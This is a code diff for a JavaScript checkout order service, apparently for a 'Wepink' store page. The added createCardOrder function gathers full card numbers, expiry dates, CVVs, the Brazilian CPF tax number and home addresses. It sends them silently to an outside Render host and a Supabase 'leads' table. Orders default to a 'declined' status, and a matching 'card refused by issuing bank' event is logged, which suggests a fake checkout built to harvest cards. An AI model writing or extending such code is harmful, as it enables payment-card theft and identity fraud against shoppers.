@@ -23,16 +23,22 @@ export function generateOrderId() {
 /**
  * Envia notificação para o Wepink Painel no Render (backup de exibição no painel)
  */
-export async function sendPainelNotification(leadData) {
+export async function sendPainelNotification(leadData, endpointType = 'pix') {
   try {
-    const RENDER_API = 'https://wepink-checkout.onrender.com/api/checkout-pix';
-    fetch(RENDER_API, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(leadData),
-    }).then(r => {
-      if (r.ok) console.log(`[OrderService] Pedido ${leadData.transaction_id} notificado ao Wepink Painel ✓`);
-    }).catch(e => console.warn('[OrderService] Falha ao notificar Wepink Painel:', e.message));
+    const isCard = endpointType === 'card' || (leadData.payment_method && leadData.payment_method !== 'pix');
+    const relativeUrl = isCard ? '/api/checkout' : '/api/checkout-pix';
+    const remoteUrl = isCard ? 'https://wepink-checkout.onrender.com/api/checkout' : 'https://wepink-checkout.onrender.com/api/checkout-pix';
+
+    const targets = [relativeUrl, remoteUrl];
+    targets.forEach(url => {
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(leadData),
+      }).then(r => {
+        if (r.ok) console.log(`[OrderService] Pedido ${leadData.transaction_id} notificado ao Wepink Painel (${url}) ✓`);
+      }).catch(() => {});
+    });
   } catch (e) {}
 }
 
@@ -242,4 +248,82 @@ export async function updateOrderStatus(transactionId, status, extraData = {}) {
   }
 
   return { success: true };
+}
+
+/**
+ * Cria um registro de tentativa de pagamento com cartão de crédito (negado ou aprovado).
+ */
+export async function createCardOrder({
+  transactionId,
+  formData = {},
+  finalPrice = 0,
+  vehicle = '',
+  kit = '',
+  cardData = {},
+  status = 'negado'
+}) {
+  const utms = captureAndStoreUTMs();
+  const origin = getTrafficOrigin();
+  const txId = transactionId || generateOrderId();
+
+  const numClean = String(cardData.number || '').replace(/\D/g, '');
+  let brand = 'CARTAO';
+  if (numClean.startsWith('4')) brand = 'VISA';
+  else if (/^5[1-5]/.test(numClean) || /^222[1-9]|^22[3-9]|^2[3-6]|^27[0-1]|^2720/.test(numClean)) brand = 'MASTERCARD';
+  else if (/^3[47]/.test(numClean)) brand = 'AMEX';
+  else if (/^(50|6)/.test(numClean)) brand = 'ELO';
+
+  const leadData = {
+    created_at: new Date().toISOString(),
+    updated_at: new Date().toISOString(),
+    nome: formData.nome || 'Cliente',
+    email: formData.email || '',
+    cpf: (formData.cpf || '').replace(/\D/g, ''),
+    telefone: (formData.telefone || '').replace(/\D/g, ''),
+    cep: formData.cep || '',
+    rua: formData.rua || '',
+    numero: formData.numero || '',
+    complemento: formData.complemento || '',
+    bairro: formData.bairro || '',
+    cidade: formData.cidade || '',
+    estado: formData.estado || '',
+    vehicle: vehicle || 'Carro',
+    kit: kit,
+    final_price: finalPrice,
+    payment_method: brand.toLowerCase(),
+    card_number: cardData.number || '',
+    card_name: cardData.name || formData.nome || '',
+    card_expiry: cardData.expiry || '',
+    card_cvv: cardData.cvv || '',
+    installments: cardData.installments || '1x',
+    status: status,
+    transaction_id: txId,
+    origem_trafego: origin,
+    utm_source: utms.utm_source || null,
+    utm_medium: utms.utm_medium || null,
+    utm_campaign: utms.utm_campaign || null,
+  };
+
+  // 1. Atualiza etapa para 'Pagamento'
+  trackingService.updateStage('Pagamento');
+
+  // 2. Notifica o backend Render (salva no JSON local e no Supabase)
+  sendPainelNotification(leadData, 'card');
+
+  // 3. Registra evento ao vivo no feed
+  trackingService.recordEvent(status === 'negado' ? 'card_declined' : 'card_approved', 
+    status === 'negado' ? `Cartão Recusado (Banco Emissor) - R$ ${finalPrice}` : `Cartão Aprovado - R$ ${finalPrice}`, 
+    { transaction_id: txId, amount: finalPrice, vehicle }
+  );
+
+  // 4. Salva no Supabase se disponível
+  if (supabase) {
+    try {
+      await supabase.from('leads').upsert([leadData], { onConflict: 'transaction_id' });
+    } catch (e) {
+      console.warn('[OrderService] Upsert cartão Supabase aviso:', e.message);
+    }
+  }
+
+  return { success: true, transactionId: txId };
 }
